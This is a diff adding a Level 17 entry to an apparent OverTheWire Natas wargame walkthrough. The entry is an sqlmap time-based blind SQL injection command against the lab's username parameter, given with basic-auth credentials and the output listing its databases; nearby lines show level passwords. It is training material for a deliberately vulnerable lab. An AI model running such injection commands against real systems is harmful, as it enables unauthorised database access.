@@ -274,6 +274,16 @@ Current pwd "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
 ```
 `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`
 
+### Level 17
+```bash
+$ ./sqlmap.py --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u 'http://natas17.natas.labs.overthewire.org/index.php?username=' --level 3 --dbms='MySQL 5.5' -p username --technique T --dbs
+available databases [2]:
+[*] information_schema
+[*] natas17
+
+```
+
+
 ### Level  -
 ```
 http://natas1.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
